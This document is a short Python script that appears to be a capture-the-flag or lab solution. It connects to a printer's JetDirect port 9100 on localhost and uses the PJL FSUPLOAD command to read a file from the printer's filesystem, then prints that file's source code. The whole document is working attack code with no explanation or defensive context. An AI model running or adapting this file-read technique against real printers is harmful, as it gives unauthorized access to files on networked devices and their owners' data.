#!/usr/bin/env python3
import socket
path, sz = "jetdirect.py", 6000
s = socket.socket()
s.settimeout(30)
s.connect(("127.0.0.1", 9100))
s.sendall(f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={sz}\r\n'.encode())
d = b""
while len(d) < sz + 500:
    try:
        c = s.recv(65536)
    except socket.timeout:
        break
    if not c:
        break
    d += c
s.close()
# drop PJL header line(s)
text = d.decode(errors="replace")
if "import " in text:
    i = text.find("import ")
    text = text[i:]
print(text)